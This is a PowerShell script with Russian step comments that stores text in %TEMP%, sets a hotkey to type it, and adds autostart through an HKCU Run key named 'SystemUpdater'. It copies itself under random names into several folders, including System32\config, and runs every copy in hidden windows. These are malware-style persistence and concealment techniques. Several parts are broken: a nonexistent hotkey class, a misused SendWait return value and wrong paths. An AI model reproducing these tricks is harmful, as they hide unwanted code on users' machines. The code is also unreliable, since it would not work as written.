$data = [System.Text.Encoding]::UTF8.GetBytes("Строка1`nСтрока2`nСтрока3")
$encodedData = [Convert]::ToBase64String($data)

# Шаг 2: Распаковка файла при первом запуске
if (-not (Test-Path "$env:TEMP\data.txt")) {
    Set-Content -Path "$env:TEMP\data.txt" -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedData)))
}

# Шаг 3: Автозагрузка через реестр (без админских прав)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdater" /d "$env:TEMP\script.ps1" /f

# Шаг 4: Распределение скрипта по директориям
$dirs = @(
    "$env:TEMP",
    "C:\Windows\System32\config",
    "$env:APPDATA\Roaming"
)
foreach ($dir in $dirs) {
    Copy-Item -Path "$PWD\script.ps1" -Destination "$dir\backup_$([Guid]::NewGuid()).ps1"
}

# Шаг 5: Обработка горячих клавиш Ctrl+Alt+Q
Add-Type -TypeDefinition @"
using System;
using System.Windows.Forms;

public class KeyHook {
    public static void Register() {
        var hm = new Hotkeys();
        hm.RegisterHotKey(new[] { Keys.Q }, true, true); // Ctrl+Alt+Q
    }
}
"@

# Шаг 6: Логика вставки строки
function OnHotkeyPressed {
    $content = Get-Content "$env:TEMP\data.txt" -First 1
    if ([System.Windows.Forms.SendKeys]::SendWait($content)) {  
        Write-Host "Строка вставлена"
    } else {
        Add-Content "$env:USERPROFILE\output.log" $content
    }
}

# Шаг 7: Запуск из разных точек (без админских прав)
$backupScripts = Get-ChildItem -Path $dirs | Where { $_.Name -like "backup_*.ps1" }
foreach ($script in $backupScripts) {
    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-File `"$($script.FullName)`""
}
